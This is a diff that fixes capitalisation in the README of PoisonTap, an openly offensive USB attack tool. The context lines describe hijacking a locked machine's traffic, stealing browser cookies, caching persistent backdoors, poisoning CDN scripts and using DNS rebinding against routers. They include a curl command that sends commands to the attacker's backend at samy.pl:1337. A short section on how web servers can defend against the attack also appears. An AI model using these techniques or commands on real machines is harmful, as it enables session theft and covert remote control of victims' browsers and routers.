@@ -8,7 +8,7 @@ When **[PoisonTap](https://samy.pl/poisontap)** (<a href="http://amzn.to/2eMr2WY
 * hijacks **all Internet traffic** from the machine (*despite* being a low priority/unknown network interface)
 * siphons and stores HTTP cookies and sessions from the web browser for the Alexa top 1,000,000 websites
 * exposes the **internal router** to the attacker, making it accessible **remotely** via outbound WebSocket and DNS rebinding (thanks <a href="https://maustin.net" target=_blank>Matt Austin</a> for rebinding idea!)
-* installs a persistent web-based backdoor in HTTP cache for hundreds of thousands of domains and common Javascript CDN URLs, all with access to the user's cookies via cache poisoning
+* installs a persistent web-based backdoor in HTTP cache for hundreds of thousands of domains and common JavaScript CDN URLs, all with access to the user's cookies via cache poisoning
 * allows attacker to **remotely** force the user to make HTTP requests and proxy back responses (GET & POSTs) with the **user's cookies** on any backdoored domain
 * does **not** require the machine to be unlocked
 * backdoors and remote access persist **even after device is removed** and attacker sashays away
@@ -58,13 +58,13 @@ In a nutshell, PoisonTap performs the following:
 
 ### *Network Hijacking*
 * Attacker plugs PoisonTap (such as weaponized <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a>) into a locked computer (even if computer is password protected)
-* PoisonTap emulates an Ethernet device (eg, Ethernet over USB/Thunderbolt) -- by default, Windows, OS X and Linux recognize an ethernet device, automatically loading it as a low-priority network device and performing a DHCP request across it, **even when the machine is locked or password protected**
+* PoisonTap emulates an Ethernet device (eg, Ethernet over USB/Thunderbolt) -- by default, Windows, OS X and Linux recognize an Ethernet device, automatically loading it as a low-priority network device and performing a DHCP request across it, **even when the machine is locked or password protected**
 * PoisonTap responds to the DHCP request and provides the machine with an IP address, however the DHCP response is crafted to tell the machine that the entire IPv4 space (0.0.0.0 - 255.255.255.255) is part of the PoisonTap's local network, rather than a small subnet (eg 192.168.0.0 - 192.168.0.255)
   * Normally it would be irrelevant if a secondary network device connects to a machine as it will be given lower priority than the existing (trusted) network device and won't supersede the gateway for Internet traffic, *but...*
   * Any routing table / gateway priority / network interface service order security is **bypassed** due to the priority of "LAN traffic" over "Internet traffic"
   * PoisonTap exploits this network access, even as a low priority network device, because **the *subnet* of a *low priority* network device is given higher priority than the *gateway* (default route) of the *highest priority* network device**
   * This means if traffic is destined to 1.2.3.4, while normally this traffic would hit the default route/gateway of the primary (non-PoisonTap) network device, PoisonTap actually gets the traffic because the PoisonTap "local" network/subnet supposedly contains 1.2.3.4, and every other IP address in existence ;)
-  * Because of this, all Internet traffic goes over PoisonTap, even though the machine is connected to another network device with higher priority and proper gateway (the true wifi, ethernet, etc.)
+  * Because of this, all Internet traffic goes over PoisonTap, even though the machine is connected to another network device with higher priority and proper gateway (the true WiFi, Ethernet, etc.)
 
 ![Cookie Siphoning](https://samy.pl/poisontap/cookies2.gif)
 
@@ -74,11 +74,11 @@ In a nutshell, PoisonTap performs the following:
 * Upon this HTTP request, because all traffic exits onto the PoisonTap device, PoisonTap DNS spoofs on the fly to return its own address, causing the HTTP request to hit the PoisonTap web server (<a href="https://nodejs.org/" target="_blank">Node.js</a>)
 	* If the DNS server is pointing to an internal IP (LAN) that PoisonTap cannot get privilege for, the attack continues to function as the internal DNS server will produce public IP addresses for the various domains attacked, and it is the public IP addresses that PoisonTap has already hijacked
 	* Once the internal DNS server responds, the web browser hits the public IP, ultimately hitting the PoisonTap web server (Node.js) in either scenario
-* When the Node web server receives the request, PoisonTap responds with a response that can be interpreted as HTML or as Javascript, both of which execute properly (many websites will load HTML or JS in background requests)
+* When the Node web server receives the request, PoisonTap responds with a response that can be interpreted as HTML or as JavaScript, both of which execute properly (many websites will load HTML or JS in background requests)
 * The HTML/JS-agnostic page then produces many hidden iframes, each iframe across a different Alexa-top-1-million domain
   * Any "X-Frame-Options" security on the domain is **bypassed** as PoisonTap is now the HTTP server and chooses which headers to send to the client
   * As every iframe HTTP request to a site is made (eg, http://nfl.com/PoisonTap), the HTTP cookies are sent from the browser to the "public IP" hijacked by PoisonTap, which swiftly logs the cookies/authentication information, **logging tens of thousands of the user's cookies into PoisonTap**
-  * Any "HttpOnly" cookie security is **bypassed** and those cookies are captured as no Javascript is executed on the domain itself, but rather only used to load the iframe in the first place
+  * Any "HttpOnly" cookie security is **bypassed** and those cookies are captured as no JavaScript is executed on the domain itself, but rather only used to load the iframe in the first place
   * Any Cross-Origin Resource Sharing or Same-Origin Policy security is **bypassed** as the domain being accessed appears legitimate to the browser
   * Because we're capturing cookies rather than credentials, any 2FA/MFA implemented on the site is **bypassed** when the attacker uses the cookie to login. This is because we're not actually performing the login function but rather continuing an already logged-in session which does **not** trigger two-factor authentication
   * If a server is using HTTPS, but the cookies do not explicitly set the <a href="https://www.owasp.org/index.php/SecureFlag" target="_blank">Secure</a> cookie flag, the HTTPS protection is **bypassed** and the cookie is sent to PoisonTap
@@ -87,11 +87,11 @@ In a nutshell, PoisonTap performs the following:
 
 ### *Remotely Accessible Web-Based Backdoors*
 
-* While PoisonTap was producing thousands of iframes, forcing the browser to load each one, these iframes are not just blank pages at all, but rather **HTML+Javascript backdoors** that are **cached indefinitely**
+* While PoisonTap was producing thousands of iframes, forcing the browser to load each one, these iframes are not just blank pages at all, but rather **HTML+JavaScript backdoors** that are **cached indefinitely**
 * Because PoisonTap force-caches these backdoors on each domain, the backdoor is tied to that domain, enabling the attacker to use the domain's cookies and launch same-origin requests in the future, even if the user is currently not logged in
   * For example, when the http://nfl.com/PoisonTap iframe is loaded, PoisonTap accepts the diverted Internet traffic, responds to the HTTP request via the Node web server
   * Additional HTTP headers are added to cache the page indefinitely
-* The actual response of the page is a combination of HTML and Javascript that produces a persistent WebSocket out to the attacker's web server (over the Internet, not on the PoisonTap device)
+* The actual response of the page is a combination of HTML and JavaScript that produces a persistent WebSocket out to the attacker's web server (over the Internet, not on the PoisonTap device)
   * The WebSocket remains open allowing the attacker to, at any point in the future, connect back to the backdoored machine and perform requests across any origin that has the backdoor implemented (the Alexa top 1,000,000 sites -- see below)
   * If the backdoor is opened on one site (e.g., nfl.com), but the user wishes to attack a different domain (e.g., pinterest.com), the attacker can load an iframe on nfl.com to the pinterest.com backdoor (http://pinterest.com/PoisonTap)
   * Again, any "X-Frame-Options", Cross-Origin Resource Sharing, and Same-Origin Policy security on the domain is entirely **bypassed** as the request will hit the cache that PoisonTap left rather than the true domain
@@ -100,7 +100,7 @@ In a nutshell, PoisonTap performs the following:
 
 ### *Internal Router Backdoor & Remote Access*
 
-* The one network PoisonTap is not able to hijack is the actual LAN subnet of the true network interface (for example, if the user's wifi subnet is 192.168.0.x, this network is unaffected), *but...*
+* The one network PoisonTap is not able to hijack is the actual LAN subnet of the true network interface (for example, if the user's WiFi subnet is 192.168.0.x, this network is unaffected), *but...*
 * PoisonTap force-caches a backdoor on a special host, specifically the target router's IP prepended to ".ip.samy.pl", e.g. 192.168.0.1.ip.samy.pl, essentially producing a **persistent** DNS rebinding attack
   * When using PoisonTap as the DNS server (victim using public DNS server), PoisonTap responds with the specialized PoisonTap IP temporarily (1.0.0.1), meaning any requests at that moment will hit the PoisonTap web server
   * If instead the DNS server is set to the internal network (e.g., 192.168.0.x), an additional specially crafted request is made to 1.0.0.1**.pin.**ip.samy.pl which tells my specialized DNS server (on the public Internet) to **temporarily** respond to any [ip.address].ip.samy.pl address with the "pinned" address (1.0.0.1) for several seconds
@@ -124,9 +124,9 @@ In a nutshell, PoisonTap performs the following:
 
 ### Additional Remotely Accessible Web-Based Backdoors
 
-* Additionally, PoisonTap replaces thousands of common, CDN-based Javascript files, e.g. Google and jQuery CDNs, with the correct code plus a backdoor that gives the attacker access to any domain loading the infected CDN-based Javascript file
+* Additionally, PoisonTap replaces thousands of common, CDN-based JavaScript files, e.g. Google and jQuery CDNs, with the correct code plus a backdoor that gives the attacker access to any domain loading the infected CDN-based JavaScript file
 * Because a backdoor is left on each domain, this allows the attacker to remotely force the backdoored browser to perform **same-origin** requests (AJAX GET/POSTs) on virtually any major domain, even if the victim does not currently have any open windows to that domain
-* The backdoor will now live on any additional site that also uses one of these infected, HTTP-based, CDN Javascript frameworks when the victim visits the site
+* The backdoor will now live on any additional site that also uses one of these infected, HTTP-based, CDN JavaScript frameworks when the victim visits the site
 
 -----
 
@@ -141,7 +141,7 @@ If you are running a web server, securing against PoisonTap is simple:
 * **Use HTTPS exclusively**, at the very least for authentication and authenticated content
   * Honestly, you should use HTTPS exclusively and always redirect HTTP content to HTTPS, preventing a user being tricked into providing credentials or other PII over HTTP
 * Ensure Secure flag is enabled on cookies, preventing HTTPS cookies from leaking over HTTP
-* When using remote Javascript resources, use the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" target=_blank>Subresource Integrity</a> script tag attribute
+* When using remote JavaScript resources, use the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" target=_blank>Subresource Integrity</a> script tag attribute
 * Use <a href="https://www.wikiwand.com/en/HTTP_Strict_Transport_Security" target=_blank>HSTS</a> to prevent HTTPS downgrade attacks
 
 
@@ -185,7 +185,7 @@ Place dhcpd.conf in /etc/dhcp/dhcpd.conf and the rest of the files in /home/pi/p
 
 There are a number of <a href="https://github.com/samyk/poisontap" target=_blank>files in the repo</a>, which are used on different sides. The list:
 
-* **backdoor.html** - Whenever a http://hostname/PoisonTap URL is hit to exfiltrate cookies, this file is what is returned as the force-cached content. It contains a backdoor that produces an outbound websocket to samy.pl:1337 (adjustable to any host/port) that remains opens waiting for commands from the server. This means when you load an iframe on a site, such as http://hostname/PoisonTap, this is the content that gets populated (even after PoisonTap is removed from the machine).
+* **backdoor.html** - Whenever a http://hostname/PoisonTap URL is hit to exfiltrate cookies, this file is what is returned as the force-cached content. It contains a backdoor that produces an outbound WebSocket to samy.pl:1337 (adjustable to any host/port) that remains opens waiting for commands from the server. This means when you load an iframe on a site, such as http://hostname/PoisonTap, this is the content that gets populated (even after PoisonTap is removed from the machine).
 * **backend_server.js** - This is the Node.js server that you run on your Internet-accessible server. It is what the backdoor.html connects to (eg, samy.pl:1337). This is the same server you connect to send commands to your PoisonTapped minion machines, eg
 
 ```bash
@@ -198,8 +198,8 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 ```
 * **pi_poisontap.js** - This runs via Node.js on the Raspberry Pi Zero and is the HTTP server responsible for handling any HTTP requests intercepted by PoisonTap, storing siphoned cookies, and injecting the cached backdoors.
 * **pi_startup.sh** - This runs upon startup on the Raspberry Pi Zero in order to set the device up to emulate an Ethernet-over-USB gadget, set up our evil DHCP server, allow traffic rerouting, DNS spoofing, and to launch pi_poisontap.js above. 
-* **target_backdoor.js** - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.
-* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara on CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
+* **target_backdoor.js** - This file is prepended to any CDN-related JavaScript files, thus backdooring them, e.g. Google CDN's jQuery URL.
+* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as JavaScript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara on CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
 * **poisontap.cookies.log** - This file is generated once the user's machine starts sending HTTP requests to PoisonTap and logs the cookie from the browser along with the associated URL/domain it belongs to.
 
 -----
